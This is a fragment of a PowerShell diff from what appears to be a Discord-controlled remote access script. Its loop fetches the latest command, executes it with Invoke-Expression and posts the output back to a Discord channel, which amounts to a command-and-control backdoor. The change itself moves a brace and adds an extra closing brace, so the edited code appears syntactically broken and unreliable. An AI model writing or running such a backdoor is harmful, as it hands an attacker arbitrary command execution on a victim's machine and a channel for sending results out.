@@ -24,11 +24,13 @@ $last = ""
 while ($true) {
     try {
         $cmd = Get-LastCommand
-        if ($cmd -ne $last -and $cmd -notmatch "^!") {
+        if ($cmd -ne $last -and $cmd -notmatch "^!") 
+        {
             $output = Invoke-Expression $cmd | Out-String
             Send-DiscordMessage "```\n$output`n```"
             $last = $cmd
         }
+    }
     }
     catch {
         Send-DiscordMessage "ERROR: $($_.Exception.Message)"
